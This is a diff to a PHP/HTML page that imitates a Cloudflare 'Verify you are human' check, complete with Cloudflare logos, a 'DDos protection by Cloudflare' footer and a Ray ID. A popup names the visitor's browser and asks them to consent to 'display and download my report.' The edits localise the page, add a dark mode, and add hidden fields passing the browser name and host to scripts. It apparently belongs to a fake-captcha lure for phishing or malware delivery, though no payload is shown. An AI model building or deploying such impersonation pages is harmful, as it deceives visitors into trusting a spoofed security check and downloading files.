@@ -86,37 +86,51 @@
 <!-- get browser name -->
 <?php
 	function getBrowserName() {
-	    $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-	    if (strpos($userAgent, 'Firefox') !== false) {
-	        return 'Mozilla Firefox';
-	    } elseif (strpos($userAgent, 'Chrome') !== false && strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Edge') === false) {
-	        return 'Google Chrome';
-	    } elseif (strpos($userAgent, 'Edge') !== false) {
-	        return 'Microsoft Edge';
-	    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
-	        return 'Apple Safari';
-	    } elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) {
-	        return 'Opera';
-	    } elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
-	        return 'Internet Explorer';
-	    }
+    // Get the user agent string
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-	    return 'Unknown Browser';
-	}
+    // Initialize the browser name variable
+    $browser = "Unknown Browser";
+
+    // Check for Microsoft Edge (Chromium-based and Legacy Edge)
+    if (strpos($user_agent, 'Edg') !== false) {
+        $browser = "Microsoft Edge";
+    // Check for Opera
+    } elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
+        $browser = "Opera";
+    // Check for Google Chrome (after checking for Opera and Edge)
+    } elseif (strpos($user_agent, 'Chrome') !== false) {
+        $browser = "Google Chrome";
+    // Check for Mozilla Firefox
+    } elseif (strpos($user_agent, 'Firefox') !== false) {
+        $browser = "Mozilla Firefox";
+    // Check for Safari (excluding Chrome and Edge)
+    } elseif (strpos($user_agent, 'Safari') !== false) {
+        $browser = "Safari";
+    }
+
+    // Output the detected browser
+    return $browser;
+  }
 ?>
+
+<input type="hidden" value="<?php echo getBrowserName(); ?>" id="browserName" />
+<input type="hidden" value="<?php echo $_SERVER['HTTP_HOST']; ?>" id="httpHOST" />
 
 <!-- Pop up -->
 <div id="popup">
 	<div>
-		To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed. <br>
+		<div data-translate="popup-msg">
+      To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed.
+    </div>
 		<label>
 			<input type="checkbox" id="checkbox">
-			<p>I agree to allow from <?php echo $_SERVER['HTTP_HOST'] ?> to display and download my report.</p>
+			<p data-translate="popup-check">I agree to allow from <span style="font-weight: 500;"><?php echo $_SERVER['HTTP_HOST'] ?></span> to display and download my report.</p>
 		</label>
 	</div>
 	<div>
-		<button id="report" disabled>View Report</button>
+		<button id="report" disabled data-translate="view_report">View Report</button>
 	</div>
 </div>
 
@@ -147,8 +161,8 @@
 
           </div>
 
-          <div class="captcha-text" id="captcha-text" style="color: #ccc;">
-            Verify you are human
+          <div class="captcha-text" id="captcha-text" style="color: #ccc;" >
+            <span data-translate="verify-human">Verify you are human</span>
           </div>
         </div>
 
@@ -156,13 +170,13 @@
         <div class="captcha-footer">
           <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
           <div class="captcha-privacy">
-            <a href="#" style="color: #ccc; text-decoration: underline;">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;">Terms</a>
+            <a href="#" style="color: #ccc; text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;" data-translate="terms">Terms</a>
           </div>
         </div>
 
         <!-- Error message outside the captcha box -->
         <div class="error-message" id="error-message">
-          There was a problem, please try again.
+          <span data-translate="issue">There was a problem, please try again.</span>
         </div>
       </div>
 
@@ -191,8 +205,8 @@
 
           </div>
 
-          <div class="captcha-text" id="captcha-text">
-            Verify you are human
+          <div class="captcha-text" id="captcha-text" >
+            <span data-translate="verify-human">Verify you are human</span>
           </div>
         </div>
 
@@ -200,13 +214,13 @@
         <div class="captcha-footer">
           <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
           <div class="captcha-privacy">
-            <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
+            <a href="#" style="text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="text-decoration: underline;" data-translate="terms">Terms</a>
           </div>
         </div>
 
         <!-- Error message outside the captcha box -->
         <div class="error-message" id="error-message">
-          There was a problem, please try again.
+          <span data-translate="issue">There was a problem, please try again.</span>
         </div>
       </div>
 
@@ -214,8 +228,6 @@
     <!-- Captcha Section End -->
 
   <?php endif; ?>
-
-
 
 
 <div id="board">
@@ -240,14 +252,29 @@
 		</div>
 	</div>
 
-	<p id="bottomText">
-		<span data-translate="ddos">DDos protection by</span> <strong class="a_color">Cloudflare</strong>
-	</p>
+  <?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
 
-	<p>
-		<span data-translate="ray_id">Ray ID: </span>
-		<strong class="a_color" id="ray-id"></strong>
-	</p>
+        <p id="bottomText" style="color: #fff; font-weight: 500;">
+          <span data-translate="ddos">DDos protection by</span> <strong class="a_color" style="color: inherit; font-weight: inherit;">Cloudflare</strong>
+        </p>
+
+        <p>
+          <span data-translate="ray_id">Ray ID: </span>
+          <strong class="a_color" id="ray-id" style="color: #fff; font-weight: lighter;"></strong>
+        </p>
+  
+  <?php else: ?>
+  
+        <p id="bottomText">
+          <span data-translate="ddos">DDos protection by</span> <strong class="a_color">Cloudflare</strong>
+        </p>
+
+        <p>
+          <span data-translate="ray_id">Ray ID: </span>
+          <strong class="a_color" id="ray-id"></strong>
+        </p>
+
+  <?php endif; ?>
 
 
 </div>
